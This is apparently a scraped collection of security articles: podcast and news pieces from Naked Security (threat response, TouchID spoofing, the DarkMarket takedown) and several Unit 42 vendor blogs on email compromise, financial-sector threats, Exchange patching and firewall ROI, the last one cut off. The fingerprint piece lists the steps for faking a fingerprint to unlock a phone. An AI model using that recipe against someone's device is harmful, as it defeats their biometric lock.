\u201cTechnique ABC\u201d, regardless of which particular security product might have referred to it. \n So, it provides that common language, which makes it  easier for customers, for security teams, and incident response teams to  talk the same language when they\u2019re trying to identify the characteristics of an attack. \n \n PD.  Yes, because malware and threat vocabulary, for want of a better word, has always been a bit of a problem, hasn\u2019t it?  \n Right back to the 1980s: \u201cIs it the Italian virus? Is it the Bouncing Ball virus, or is it the Ping Pong virus?\u201d \n \n FH.  [LAUGHS] Yes. \n \n PD.  Is it the Stoned virus, or the New Zealand virus? \n \n FH.  The way we see MITRE-related labeling and classification being used will change drastically in the next 12, 24 months and it will become a much more integral part of how organizations manage their protection. \n But more importantly, as you just touched on, how they manage their response to malware incidents, or even just user activity \u2013 users doing unusual or inappropriate actions on their machines, even without malicious intent. \n \n PD.  Yes, things that could open up a hole that they never intended, but didn\u2019t think of.  \n So, Fraser to finish up, because I\u2019m conscious of time, I\u2019d actually like to look at this whole threat response idea.  \n These days, just relying on \u201cfind the malware \u2013 detect the malware \u2013 block the malware \u2013 remediate the malware \u2013 print a lo -, pat yourself on the back \u2013 get ready for next week\u2019s attacks\u201d\u2026 that doesn\u2019t work anymore, does it?  \n Because, often, attacks may be done deliberately by the crooks, just so they can sound out your defences.  \n So, even if you successfully defend today, what you could be looking at is actually a little bit of a hint that something much worse is likely to happen tomorrow! \n \n Sophos 2021 Threat Report: Navigating cybersecurity in an uncertain world \n \n \n \n FH.  Yes, and that\u2019s actually a very, very common scenario.  \n The biggest change between those times you talk about and today is actually human-led attacks.  \n So, we talk about \u201chuman adversaries\u201d, and what we\u2019re really talking about is one or more cybercriminals who already have presence within your network \u2013 they\u2019ve already got in.  \n Maybe it\u2019s an unmanaged machine; maybe it\u2019s a machine without security patches; maybe it\u2019s a machine where the security has been disabled.  \n Regardless of any of that, the attacker is already on the network. \n They\u2019re going to then use that persistence, use that presence, to map out the network, to laterally move across the network, and ultimately to deliver their attack. \n \n PD.  And let\u2019s be clear, at this point, there are no flaming skulls on your website homepage\u2026 \n \n FH.  Correct! \n \n PD.  \u2026 to give away that the crooks are in your network. [LAUGHS] \n \n FH.  Yes. \n \n PD.  Because it\u2019s a human-led attack, it\u2019s not like software pretending to a sysadmin.  \n If they\u2019ve managed to promote themselves to an administrator account, they basically *are* sysadmins\u2026 \n \n FH.  Yes. \n \n PD.  \u2026they\u2019re not *your* sysadmins, unfortunately. \n \n FH.  Yes.  \n So, you tend to find that they try and initiate an attack, and a good security product will block that attack, but they\u2019re still on the network.  \n And so they try something different, and they can continually repeat this whole process until, eventually, they win.  \n And so, whatever security product you have has to succeed 100% of the time to prevent that particular attack succeeding.  \n This is where services like Managed Threat Response (MTR) can help, because they can recognize these early signs of that type of attack, and they can boot that person off the network and remediate the attack before the truly malicious part is delivered, be it ransomware, data theft or whatever. \n \n PD.  Just booting them off the network\u2026 even that\u2019s not enough, is it? \n \n FH.  No. \n \n PD.  Because you have to get in your\u2026 what I like to call the \u201cNetwork Time Machine\u201d, and go backwards\u2026 \n When these guys were making themselves sysadmins, they probably created a few other accounts\u2026 \n \n FH.  Yes. \n \n PD.  \u2026and they probably spent the time to learn what your network and account naming system looks like.  \n So, if they\u2019ve created fake accounts, they\u2019re not going to have weird or outrageous names \u2013 they\u2019re going to look like somebody else on the network. \n They really do try to blend in, don\u2019t they?  \n That\u2019s what we call \u201cliving off the land\u201d, isn\u2019t it? \n \n Living off another land: Ransomware borrows vulnerable driver to remove security software \n \n \n \n FH.  It is. \n Using tools ideally that are already present on these systems, or if they aren\u2019t, minimizing the amount of new tools that they\u2019re introducing to the victim machines.  \n And it\u2019s all to stay sub-radar.  \n As you said, any good Managed Threat Response service, aside from just kind of getting these criminals off your network, will then try to work out, \u201cOK, well, well, what did they do?\u201d  \n \u201cWhat do we need to undo?\u201d \n And also, perhaps most crucially, \u201cHow did they get onto the network in the first place?\u201d \n \n PD.  Exactly. \n \n FH.  What was it about your security posture that made it easy, or made it possible, for them to get on the network? \n The case is not really closed until all of those ducks are lined up, if you like. \n \n PD.  Fraser, let\u2019s finish up, then, by me asking you\u2026 \n If you\u2019re a business, and you don\u2019t have a huge amount of time and money leftover, but you figure, \u201cI actually want to get into this modern threat hunting mindset, rather than just thinking of security as a sort of set and forget thing,\u201d which never really worked well, but definitely doesn\u2019t now\u2026 \n \u2026what would your primary advice be? \n \n FH.  If the budget allowed, I would use a Managed Threat Response type service. \n Use people with the skillset to manage all these indicators that are flowing from your network, and give you a heads-up warning to potential or imminent attacks. \n \n PD.  It is *not* an admission of defeat, is it? \n \n FH.  Not at all, no!  \n It\u2019s essentially acknowledging the real threat that pretty much all businesses face today.  \n If that isn\u2019t in budget, my focus would be on using the security product that you deploy effectively.  \n So: visibility \u2013 maintaining visibility of what\u2019s happening in the network. \n Make somebody in IT responsible for keeping track of what\u2019s going on in your dashboard. \n Don\u2019t live with a security environment where 20, 30, 40 alerts are going through each day, each week, and no one\u2019s really following up.  \n In any well-managed environment, you will have a good handle of what is normal. \n And finally: control.  \n Use some of the tools that your security application almost certainly already offers that you might not yet use.  \n Use the control features that, for example, your operating system might provide to help lock down systems, and help empower your employees to get their work done, but actually to treat your systems with respect. \n \n MTR in Real Time: Hand-to-hand combat with REvil ransomware chasing a $2.5 million pay day \n \n \n \n PD.  Because, as we like to say on the Naked Security podcast: \u201cWhen it comes to cybersecurity, sometimes an injury to one really can be an injury to all.\u201d \n \n FH.  Yes. \n \n PD.  Fraser, I think that\u2019s a great place on which to end.  \n Thank you so much for your time. \n Thanks to everybody who tuned in.  \n And it remains for me only to say:  \u201cUntil next time, stay secure.\u201d \n \n FH.  Stay secure! \n [FX: MORSE CODE SIGNOFF] \n Learn more about Sophos Managed Threat Response here: Sophos MTR \u2013 Expert Led Response \u00a0\u00a0\u25b6 24/7 threat hunting, detection, and response \u00a0\u00a0\u25b6 \n \n \n\t\t\t",

In the USA, for example, would fingerprint unlock \u201ccodes\u201d enjoy the same Fifth Amendment protection against self-incrimination as numeric or alphabetic lock codes? Would \u201csomething you have\u201d be  protected under the right to silence  in the same way as \u201csomething you know\u201d?\n What if your fingerprint data were stolen?  Lock codes and passphrases can easily be changed if you think someone else has phished or stolen them. In the USA, even social security numbers \u2013 once regarded as immutable unless you entered a witness protection program \u2013 can  now be reissued  after a cybersecurity compromise. But how would you get new fingerprints?\n What if someone cut off your finger to unlock your phone?  The good news here is that dead fingers don\u2019t work for electrical reasons, so there\u2019s not much point in taking such a desperate step. But what if the criminals  don\u2019t know that it doesn\u2019t work  and try it anyway?\n What if someone were to copy your fingerprint?  After all, even though we now know how to do DNA matching, fingerprint evidence is still a handy investigative technique in law enforcement for the very simple reason that we leave copies of our fingerprints quite literally on everything we touch. Gloves might help, but how would you unlock and use your phone then?\n \n Interestingly, the last concern turned out to be well-founded, given that just one week after writing about the launch of the iPhone 5s and its biometric home button, we wrote about how the Chaos Computer Club (CCC) in Germany had announced a way to  make fake fingerprints  that would fool Apple\u2019s sensor. \n Despite the CCC\u2019s widely publicised hack, however, locking your phone with a fingerprint was certainly better than not locking it at all, and the TouchID feature quickly caught on. \n How the CCC hack worked.  Photograph a fingerprint, e.g. from the glass surface of the phone itself. Invert image to swap round black and white so the valleys are dark and the raised parts are light. Print on laser printer with the toner setting turned right up so the maximum amount of powder gets deposited to form a sort of 2.5-dimensional mould. Cover with wood glue and allow to dry fully. Carefully peel rubbery \u201cfingerprint\u201d off the \u201cmould\u201d. Place fake \u201cfingerprint\u201d on end of real finger. Breathe onto glue so the moisture makes it a tiny bit conductive. Swipe to unlock phone (maybe). \n Plus \u00e7a change\u2026 \n But TouchID didn\u2019t last long, except on low-end Apple devices. \n The problem was not so much that users fell out with the idea of using fingerprints as a shortcut to unlock their devices, but that they fell out with the idea of having a pesky home button at all, right where there could otherwise be more screen space. \n So TouchID morphed into FaceID, using the front-facing camera, now integrated into a notch at the top of the screen. \n Instead of matching some kind of digital hash of your fingerprint, the phone matched up a post-processed image of your face instead. \n Swipe on the screen instead of pressing home, look into the camera instead of positioning your finger, and \u201cboop,\u201d you\u2019re in. \n \u2026plus c\u2019est la m\u00eame chose \n So we were surprised to see the  rumour mill  going into overdrive recently to claim that this year\u2019s new iPhone models, presumably the \u201ciPhone 13\u201d (assuming that\u2019s not considered unlucky in the North American market, where hotel elevators always seem to skip from level 12 to level 14), will be going back to TouchID. \n Why, you might ask? \n Well, the explanatory rumours behind the product rumours are surprisingly believable: even though FaceID seems to manage OK if you\u2019re wearing things like hats, headscarves, headphones or hoodies (specatacles, too)\u2026 \n \u2026it doesn\u2019t deal well with facemasks, which are commonplace these days as a sensible precaution against accidentally coughing or sneezing out coronavirus germs all over other people or products. \n The humble blue paper facemask, it seems, is a great leveller, making us look all-too-similar as far as computer \u201cvision\u201d is concerned.  \n (Human brains, apparently, have a special section dedicated entirely to distinguishing faces, which is why babies can recognise their mothers long before they can focus their eyes fully.) \n Presumably, if the rumours are true, FaceID will not go away (because which mobile phone vendor would ever consider introducing a new device without a front-facing selfie camera?), but Touch ID will be back. \n You won\u2019t have to use it \n Frankly, we prefer typed-in lock codes anyway \u2013 long enough that every digit is used at least once so that the grease-spots on the screen don\u2019t give away which numbers  aren\u2019t  in the passcode. \n We find it easier to tap in the passcode with one hand while the phone is sitting flat on our desk next to our laptop, than needing to angle the phone towards us, or lean over the camera, in order to line up our dial with its dial so it can figure out who we are. \n It also means we can put duct tape over the selfie camera if we feel like it. (To be honest, we\u2019ve never bothered, but we could if we wanted!) \n \n\t\t\t",

(Technically, he\u2019s serving two life sentences plus additional sentences of 5, 10, 15 and 20 years.) \n Well, it\u2019s happened again \u2013 yesterday, Europol announced  another dark web takedown , shuttering the abovementioned DarkMarket site and replacing its online content with a warning page: \n Click on image for Europol original in context. \n Multinational co-operation \n As you can see from the logos in the takedown page above, the operation required multinational co-operation from law enforcement teams in Germany, Australia, Denmark, Moldova, Ukraine, the UK and the USA. \n According to Europol, the servers that were taken down were located in Moldova and Ukraine; additionally, the man alleged to have operated the service was an Australian citizen who was arrested in Germany, close to the Danish border. \n Now that the servers behind the operation have been seized (more than 20 altogether, apparently), Europol says it\u2019s confident that data pulled from those servers will \u201cgive investigators new leads to further investigate moderators, sellers, and buyers.\u201d \n Of course, those servers won\u2019t have the real IP numbers and network locations of DarkMarket visitors recorded in its logs. \n Thanks to the Tor network, visits made via Tor will show up as coming from one of Tor\u2019s several thousand active nodes, rather than from the IP numbers of the visitors themselves. \n Tor always sends traffic through at least three randomly chosen nodes in its system. There are just over 6000 nodes altogether at the time of writing, run by volunteers. The first node knows your IP number, beacause you connect directly to it, but has no way of telling what you are browsing for or where you want to end up. The last node knows where your traffic ended up, but has no direct way of telling who you are (and no way, if the destination server is itself part of the Tor network, of knowing where you were going or what you were looking for). The middle node effectively serves to keep the \u201centry\u201d and \u201cexit\u201d nodes apart, which greatly reduces the chance for entry and exit nodes to collude and try to match up exits with entries in order to figure out who went where. \n Despite Tor\u2019s help in keeping users anonymous, however, we suspect that anyone with more than just a passing association with DarkMarket is probably pretty worried right now that their identity or location might somehow be revealed by the seized server data. \n There is almost certainly a huge amount of data for authorities to analyse. \n According to Europol: \u201cAt the current [exchange rates, purchasing on the site] corresponds to a sum of more than \u20ac140 million [$170M/\u00a3125M]. The vendors on the marketplace mainly traded all kinds of drugs and sold counterfeit money, stolen or counterfeit credit card details, anonymous SIM cards and malware.\u201d \n Logged cookies and browser metadata (including data leaked due to browser bugs); \u201cprivate\u201d messages shared with operators or administrators on the site with personal giveways in them; metadata left behind in uploaded files; or information derived from products traded on the site\u2026 \n \u2026any or all of those might be clues that could help law enforcement follow a few more links in the chain. \n \n LEARN MORE ABOUT THE DARK WEB \n \n If you enjoyed  this video , please visit the  Naked Security YouTube channel  and subscribe! \n \n\t\t\t",

        "title": "Nightmare Email Attacks (and Tips for Blocking Them)",
        "author": "Jenna Garbett",
        "date": "October 21, 2021 at 3:00 AM",
        "text": "This post is also available in: \u65e5\u672c\u8a9e (Japanese)\nIt was a typical day for our client, an executive with a U.S. financial services firm that relies on a widely used multi-factor authentication (MFA) mobile app to protect access to email, customer files and other sensitive data. His iPhone kept pinging him with MFA requests to access his email, interrupting him on a day packed with customer meetings. He was annoyed by the intrusion, figuring it was some kind of system error, and rejected each request so he could focus on work.\nHe thought it was over when the requests stopped. Months later, however, he learned he had mistakenly authorized one of those many requests, unknowingly granting an attacker unfettered access to his email. He learned about the compromise when his bank flagged suspicious wire transfers totalling nearly $1 million and our investigation uncovered the exposure of data belonging to the company, its employees and clients. Fortunately, the company was able to recover the stolen funds, but attacks of this nature can still be costly in terms of reputation and time and resources spent cleaning up after them.\nThis type of attack is known as a business email compromise, or BEC. Each year, Unit 42 security consultants spend thousands of hours on BEC investigations, combing through logs to identify unauthorized activity, determine how unauthorized access occurred and find security gaps that need to be addressed.\n  BEC: \u201cIt Can\u2019t Happen to Me\u201d\nMany organizations think they\u2019ve already taken steps to protect themselves against BECs. However, those steps may not have been properly implemented. Among the hundreds of BEC cases Unit 42 has worked on since the beginning of last year, our consultants determined that 89 percent of victims failed to turn on MFA or follow best practices for its implementation. That may seem surprising since the top email platforms \u2013 including Microsoft\u2019s 365 and Exchange, as well as Google Workspace \u2013 offer multiple options for implementing MFA. This highlights just how important it is for organizations to understand and follow best practices for any security tool.\nThe consequences are costly: In investigations by Unit 42 consultants since Jan. 1, 2020, the average wire fraud attempted was $567,000 and the highest was $6 million. The FBI reports that BECs caused $1.87 billion in losses last year, making it one of the most expensive types of cybercrime.\nThe good news is that identifying MFA shortcomings is typically straightforward. Assessments can identify deficiencies in security controls and provide recommendations to mitigate those shortcomings.\n  Real-World Email Attacks From the Unit 42 Case Files\nBefore diving into best practices for implementing MFA, plus other tips for preventing email compromise, it helps to understand why these best practices matter. Here are some more examples from the Unit 42 case files that show common mistakes that can lead to attackers gaining access to email environments \u2013 including when MFA is in place. We\u2019re presenting scenarios to help organizations identify potential gaps in their own security, but have anonymized the examples to protect the identities of the victims.\n  Unenforced MFA Implementation\nAttackers targeted hundreds of employees at an insurance company with phishing emails. These emails led to an attempt to harvest login credentials through spoofed Microsoft 365 email login pages that looked identical to legitimate ones set up by that firm. The attackers succeeded in gaining access to a few of those accounts, which belonged to employees who hadn\u2019t set up MFA, which led in turn to gaining access to sensitive data on an internal Sharepoint site.\n  Allowing Legacy Protocols for Email Access\nAttackers gained access to the email accounts of two employees at one client organization that failed to disable legacy authentication for synchronizing email boxes via IMAP4 and POP3. That gave the threat actors access to everything in both mailboxes for over a month, enabling them to collect personally identifiable information (PII) from the victims\u2019 contacts. This is one of the most common ways of bypassing MFA, especially in hybrid environments that have legitimate use for legacy protocols. (We provide more detail about how to handle legacy authentication below.)\n  Allowing Automatic Email Forwarding Outside the Organization\nThreat actors compromised multiple users at a job placement agency, then used those accounts to circulate job postings that asked recipients to provide personal data. They set up rules that moved all responses to hidden folders and forwarded them to an external account.\n  Best Practices for Mitigating Email Attacks\nWhile there\u2019s no silver bullet to stop email compromises, we recommend that organizations implement the following best practices. MFA implementation is crucial, but it\u2019s only one component of a comprehensive strategy for reducing the risk of email compromise and minimizing the impact of successful attacks.\nEducation: End users are commonly the weakest link in security incidents because we\u2019re susceptible to all kinds of phishing scams. Education makes users significantly more likely to be able to identify phishing attempts and report suspicious activity to security teams for appropriate review.\nEnforce MFA: Simply enabling MFA allows users to choose whether they want to set up MFA, which gives organizations a false sense of security. It\u2019s critical to not only enable, but enforce MFA by requiring users to add it to their accounts and verify every time they log in.\nUse Strong MFA: Use a one-time password (OTP) application for MFA and avoid the use of SMS for verification. Requiring a user to manually type a code generated in an OTP application (such as Google Authenticator) reduces the likelihood of a user mistakenly accepting unauthorized MFA requests in the event of brute-forcing or stolen credentials.\nControl Legacy Authentication: We recommend blocking legacy authentication by default and leveraging tools such as Azure Active Directory\u2019s conditional access to allow any specific exceptions, such as older devices or legacy on-premises SMTP relays.\nReview Network Protections: Regularly review end users\u2019 ability to execute or download code and applications, such as macro-enabled Office documents, unauthorized software, USB devices, etc. As previously recommended by our Unit 42 Threat Intelligence team, URL filtering rules should be established to restrict access by default to the following categories of domains: Newly Registered, Insufficient Content, Dynamic DNS, Parked and Malware.\nRegularly Review Delegation and Account Permissions: Regularly review user accounts and permissions, including non-owner delegation, shared mailboxes and administrative rights. Every account should be uniquely named and mapped to an individual, and credentials for service accounts or shared mailboxes should be securely stored in a password vault and protected with MFA where possible.\nDisable Client-Side Forwarding Rules: Client-side forwarding rules can be an indicator of a compromise that allows attackers to forward all inbound emails to an external address. They can also be set up by end users to forward company emails to personal email accounts. In both cases, this creates a risk to confidentiality, and we highly recommend disabling client-side forwarding rules. Users who require forwarding rules for business should have manager approval and be regularly reviewed by IT.\nAudit Logging and Event Monitoring: Ensure the logging of administrative events is enabled. Depending on the email platform or licensing level, auditing and log retention may not be enabled by default. Unit 42 recommends the aggregation of email server logs to a centralized location such as an extended detection and response (XDR) or security information and event management (SIEM) tool to retain logs for more actionable auditing and insight into email server security events. Additional data and context helps organizations better understand what normal activity looks like for an account and determine what data has been compromised in the event of an incident.\nYour organization can prepare to defend against email attacks with expert assistance.

        "title": "3 Reasons Cyberattacks Target Financial Services and How to Fight Back",
        "author": "Jen Miller-Osborn",
        "date": "August 31, 2021 at 9:00 AM",
        "text": "This post is also available in: \u7e41\u9ad4\u4e2d\u6587 (Chinese (Traditional)) \u65e5\u672c\u8a9e (Japanese)\nCybercriminals grow in both number and sophistication, and their targeting has become more strategic, focusing on maximum effectiveness and profitability. As data pours in on global cybercrime, the financial services industry has solidified its position as a target of choice.\nEven though financial services consistently outspend most of their vertical sector peers in cybersecurity staff, tools and associated investments, the cyberattacks keep coming.\nHere are three key reasons why financial services are a top target for cybercriminals, the most prevalent cyberattack types and how organizations can fight back.\n  Why Financial Services Are a Top Target for Cybercriminals\n  1. Targeting Financial Services Organizations Pays Big\nIt\u2019s no coincidence that financial services are disproportionately targeted by threat actors. The rationale is quite simple. Threat actors target organizations that have what they want and what pays big \u2013 data and money. Data can be sold for money and vulnerabilities that enable access to both data and money.\nThreat actors are becoming more sophisticated with their approach to targeting and how they determine the most profitable industries, organizations and individuals. Cybercriminals are doing more research and reconnaissance every year to better target victims, maximize their financial return and improve their likelihood of success.\nWith a plethora of rich financial and data assets, financial services are the optimal target. Not only do they control and manage valuable data, but they are also challenged to meet the growing demands of customers for an engaging digital experience.\n  2. Digital Transformation Is Expanding the Attack Surface\nCustomer demand for convenient and immediate access to financial data is driving digital transformation for financial services. Cloud technologies, data analytics and robotics are becoming essential tools for larger institutions as they work to meet the challenges of the digital economy and customer expectations. However, these new technologies expand the attack surface and the ability of threat actors to capitalize on vulnerabilities.\nAdditionally, financial services are now partnering with traditional competitors, fintech companies and even big tech companies to provide more engaging digital experiences for their customers. Customer data is collected by financial services and shared with partners to gain insights, tailor offerings and so on. However, this opens the door for data loss, misuse and even business disruptions.\nMore capable, secure digital service models and third-party partners are required to help financial services meet digital demands efficiently, but that often leads to more security complexity. These increasingly complex IT systems are harder to secure end-to-end. In addition, focusing solely on regulatory compliance can leave gaps.\nAnother potential point of vulnerability is leveraging third-party providers via remote access technologies. This can affect financial services, which can be configured insecurely without the institution\u2019s knowledge.\nIn contrast to larger institutions, smaller financial institutions (including credit unions and asset managers) may not have the expansive IT or security staff onsite to provide in-depth cybersecurity services. These smaller firms may also use email to conduct financial transactions, presenting an opportunity for threat actors to insert themselves into the process.\n  3. Securing Digital Assets Is Challenging\nSecuring digital assets is not a one-and-done process. It requires ongoing monitoring and management to keep pace with the constant evolution of both the digital landscape and in-use systems.\nHowever, sourcing the right internal IT security personnel and third-party cybersecurity vendors to support this technology can be challenging for organizations of all sizes.\nImplementing IT infrastructure takes time and expertise. It requires organizations to source the right team members to educate and lead the organization through new processes. Additionally, monitoring and managing data security requires constant training, vulnerability testing and a focus on staying ahead of new and evolving threats. As new cloud-based technology is adopted, team members must also understand the \u201cShared Responsibility Model\u201d and how to execute cloud security controls and settings that protect sensitive data.\n  What Types of Attacks Threaten Financial Services?\nFinancial services are affected by a full span of threat types, including business email compromise (BEC) and insider threats.\nAccording to the FBI, BEC is \u201ca sophisticated scam that targets both businesses and individuals who perform legitimate transfer-of-funds requests.\u201d Attackers frequently carry out this scam by compromising legitimate email accounts to perform unauthorized transfers of funds, though BEC can include other variations as well. With so many email accounts directly accessible from the internet, stolen credentials can lead not only to loss of funds, but also a breach of sensitive data.\nInsider threats occur when a member of your organization removes or reveals data or information. This is done for personal or financial gain, or to damage the reputation of your organization. Insider attacks can include leaks of confidential information, theft of intellectual property and unauthorized access to sensitive information.\nIn addition to these attack types, financial services are disproportionately affected by inadvertent disclosure of sensitive data \u2013 the accidental exposure of sensitive data, often through misconfigurations of cloud settings or web-facing applications. Because financial services rely heavily on cloud solutions and customer-facing applications to keep up with data management and customer service models, the opportunity for error is increased. Threat actors continually scan for such opportunities to compromise exposed data.\n  How Can Financial Services Stop Cyberattacks?\nTo appropriately protect your financial services organization from cyberthreats, it\u2019s important to implement cyber hygiene measures and security best practices, including Zero Trust, multi-factor authentication (MFA), DevSecOps, etc.\nInvesting in cybersecurity testing and training is also essential. This includes conducting biannual, in-depth security awareness training that goes beyond the basics, so employees learn to spot advanced threat tactics. The training program should include customized modules focused on each group in the company, addressing how they may be targeted. Training examples should cover advanced phishing techniques (getting increasingly harder each time), a broad range of social engineering tactics, signs of insider threat activities (including anonymous methods to report issues) and physical security.\nFocused, in-depth training of security and IT personnel on cloud platforms is also essential.\nNo industry is without vulnerabilities, but financial service organizations are frequently targeted by cyberattacks because of the financial and data assets they control. Ensuring that security investments are targeted in the right areas and that staff is trained appropriately to monitor and manage threats will help financial service organizations to better weather the hacker storm.\nTo help optimize and prioritize security expenditures, security assessments and penetration testing can identify weaknesses and better target investments when conducted with the appropriate level of rigor. Contact Unit 42 for more information about how to proactively assess your cybersecurity readiness and needs.\n ",

        "title": "How Quickly Are We Patching Microsoft Exchange Servers?",
        "author": "Matt Kraning",
        "date": "March 14, 2021 at 7:00 PM",
        "text": "This post is also available in: \u65e5\u672c\u8a9e (Japanese)\nAs the world learned about the four zero-day vulnerabilities in Microsoft Exchange Server and the attacks that exploited them, many people wondered how widespread the effects would be. How many organizations are vulnerable to the Microsoft Exchange Server attacks? How likely is it that attackers will take advantage? How quickly are organizations responding to the news and patching Microsoft Exchange Servers? Expanse, a recent Palo Alto Networks acquisition, which provides an attack surface management platform, collected telemetry to answer those questions.\nThe Internet is Tiny\nFifteen years ago, if you accidentally exposed a device on the Internet, it might go unnoticed by attackers for months or even years. Things are different today \u2013 attackers scrutinize your attack surface daily. With open source software anyone can download, an attacker can communicate with every public-facing IP address in IPv4 space in hours. Any unpatched system, misconfiguration or accidental exposure is likely to be discovered very quickly. The internet is tiny.\nThis is why it\u2019s crucial to apply patches promptly \u2013 new attacks such as the DearCry ransomware that began circulating around March 9 seek to take advantage of newly disclosed vulnerabilities in Microsoft Exchange Mail Servers to turn a quick profit before organizations have a chance to respond to them.\nHow Quickly are Organizations Patching Microsoft Exchange Servers?\nExpanse continuously gathers information on all Internet accessible devices, and we used our platform to find the total volume of publicly accessible Microsoft Exchange Servers and the subset of servers that were vulnerable. Comparing information gathered three days apart \u2013 March 8, and then again on March 11 \u2013 allowed us to see not only how many Microsoft Exchange Servers were vulnerable but also to glean some data about the pace at which organizations applied patches.\nOur results show that patch rates are lightning fast \u2013 36% in just three days. From FireEye data on the time between disclosure, patch release and exploitation, we know that in the past the average time to patch was nine days. But patching does not mean you\u2019re safe \u2013 assume exploitation as a result of this attack, as threat actors were observed widely launching zero-day attacks against very high numbers of Exchange Servers across the internet before a patch was released. (For information about how to handle various scenarios and determine impact on your organization, see Unit 42\u2019s \u201cRemediation Steps for the Microsoft Exchange Server Vulnerabilities.\u201d)\nIt\u2019s important to understand your attack surface from the attacker's perspective. The statistics above represent all publicly facing unpatched Exchange Mail Servers \u2013 but this does not mean the affected customers know about them. Acquisitions, foreign subsidiaries, and forgotten or rogue IT often mean enterprises miss outstanding assets, including email servers. With so many attack vectors and limited resources to defend them, it\u2019s crucial that organizations understand where the critical entry points are and how they can prioritize attack surface area reduction in a smart, data-driven way.\nHow to Understand Your Attack Surface\nThe attack surface area of an organization has never been more distributed than it is today. Organizations have to identify, track and manage more asset types across different locations than ever before. It won\u2019t work to jump from emergency to emergency \u2013 you need a new playbook.\nThe first step? Understand your attack surface. A discovery and mapping program should start with the basics:\nA system of record of every asset, system and service you own that is on the public internet.\nComprehensive indexing, spanning all major port/protocol pairs (i.e., not limited to the old perspective of only tracking HTTP and HTTPS websites).\nLeverage multiple data sources for attribution (i.e., not just registration and DNS data).\nNo reliance on agents (which can\u2019t find unknown internet assets).\nContinuous updating (i.e., not a two-week refresh rate).\nRead our response to the Microsoft Exchange Server exploit.\n ",

        "text": "The proof is in for CISOs, CFOs and network security pros. Palo Alto Networks VM-Series virtual firewalls pay for themselves, and now you can get all the details about significant 115% return on investment (ROI) over three years with a six-month payback period in a just-released Forrester Consulting study. You\u2019ll discover how these virtualized instances of our ML-Powered Next-Generation Firewalls (NGFWs) can provide savings measured in millions of dollars over a short period of time.\nThis in-depth analysis of security efficiency and cost-effectiveness is meant for all enterprise stakeholders concerned about safeguarding digital transformation and cloud migration efforts. Detailed financial modeling charts explain how the VM-Series provides quantifiable value by substantially increasing security capabilities and streamlining operations.\nSee Cost Avoidance Measured in Seven Figures\nFigure 1: 3-year ROI and net present value (NPV) of VM-Series virtual firewalls taken from The Total Economic Impact\u2122 of Palo Alto Networks VM-Series Virtual Firewalls, a commissioned study conducted by Forrester Consulting on behalf of Palo Alto Networks, September 2021\nExtensive surveying, in-depth interviews, and deep financial analysis paints a picture of security that pays off. To understand real-world challenges and needs, Forrester Consulting used this study\u2019s research to build a model of a composite organization, which obtains a net present value (NPV) of $1.83 million over three years by deploying VM-Series across multiple on-prem and public cloud environments to secure both north-south and east-west traffic.\nThese benefits stem from significant operational efficiencies and exceptional network security capabilities. VM-Series firewalls offer a broad range of capabilities that transcend today\u2019s network security challenges across public and private clouds, virtualized data centers and software-defined branch locations.\nHigh-Performance Security Slices Fixed Costs\nFigure 2: Reduction in firewall deployment time with VM-Series virtual firewalls taken from The Total Economic Impact\u2122 Of Palo Alto Networks VM-Series Virtual Firewalls, a commissioned study conducted by Forrester Consulting on behalf of Palo Alto Networks, September 2021\nAdvanced security capabilities are a significant factor in the financial value of VM-Series virtual firewalls. As the study details, organizations using the virtualized NGFW were able to achieve:\n90% reduction in time required to deploy firewalls, as well as improved network and security team efficiencies by 80%.\n30% reduction in time to achieve proper security posture, which gave security teams a head start on delivering a Zero Trust Enterprise (something that\u2019s not possible with point solutions).\n20% decrease of data breach likelihood after three years, which further allowed organizations to deliver the Zero Trust Enterprise model and apply consistent security policies across the entire organization.\n18% reduction in the number of security incidents requiring manual investigation and a subsequent 25% decrease in mean-time-to-resolution (MTTR).\nAfter investment in VM-Series virtual firewalls (designed to protect against up to 95% of unknown file and web-based threats instantly) organizations were able to fully address the network security challenges of their hybrid and multi-cloud environments. Security teams could easily deploy advanced threat prevention controls and define, enforce and manage consistent security policies from a single console. With significantly improved visibility, they were able to gain precise control over inbound, outbound and east-west traffic to greatly reduce attack surfaces.\nOperational Efficiencies Cover the Entire Organization\nFigure 3: Reduced user downtime with VM-Series virtual firewalls taken from The Total Economic Impact\u2122 Of Palo Alto Networks VM-Series Virtual Firewalls, a commissioned study conducted by Forrester Consulting on behalf of Palo Alto Networks, September 2021\nSecurity is only as good as its ability to cover the entire enterprise. Forrester discovered significant efficiencies with VM-Series firewalls. These benefits were not just for network security teams, but also for their colleagues in other business areas. As you\u2019ll read in the study, those benefits included:\n67% decrease in downtime per employee, so only 6% of an organization\u2019s employees experience a downtime event, compared to 18% in a legacy state.\n45% reduction in downtime length: Downtime events at the composite organization historically lasted an average of 4.5 hours. After deploying VM-Series firewalls, this average declines by two hours.\nThe VM-Series virtual form-factor also allowed organizations the flexibility to automate firewall deployment and provisioning, and scale with demand, which eliminated numerous over-provisioning costs.\nMake Securing Digital Transformation Seamless\nFind out why 92% of Forrester survey respondents said VM-Series virtual firewalls and accompanying cloud-delivered security services improved their organizations\u2019 management, admin and operation efforts on cybersecurity.

        "text": "This post is also available in: \u65e5\u672c\u8a9e (Japanese)\nProactively Investing in Cybersecurity Now Can Save Money Later\nThis is the second blog in a two-part series, breaking down the cost of dealing with an incident versus the cost of investing in cybersecurity to prevent an incident. Learn the value of cybersecurity and how to invest your money wisely.\nPower-Up Your People\nWhen it comes down to people, process and technology, people will always be the weakest link in an organization\u2019s metaphorical security fence. Your organization may have the most detailed, security-forward processes and top-notch technical solutions, but if your workforce is not appropriately trained, your security might as well be non-existent. Equip employees with polished, emerging and industry-relevant cybersecurity training materials. Gone are the days when a simple handout or outdated PowerPoint deck is sufficient. Instead of issuing an annual training, or one that must only be completed when an employee is first hired, ensure that security awareness is built into your organization\u2019s culture. Require a new module to be completed monthly. Run frequent phishing campaigns. Create excitement by offering small incentives for folks who successfully report malicious emails. Investing in cybersecurity awareness and overall knowledge of your workforce is the number one way to elevate your long-term security posture.\nUnderstand Your Regulatory Requirements\nTake the time to understand what regulatory requirements must be met by your business. If your organization becomes the victim of a cybersecurity attack, claiming ignorance will not save you from the monumental fines associated with regulations such as CCPA and GDPR. If your business has an especially complex environment with a large amount of customer information or Personal Health Information (PHI), it may be worth hiring a Chief Privacy Officer or vCISO. This individual should specifically focus on ensuring that customer data is appropriately protected, and that all applicable regulatory requirements are fulfilled by the business.\nPractice, Practice, Practice Incident Response Procedures\nThey say that \u201cpractice makes perfect,\u201d and Incident Response is no exemption to this rule. There is a savings of approximately $2,000,000 on average when comparing the data breach costs of an organization that tested their Incident Response Plan versus those who did not complete testing.\nHowever, many 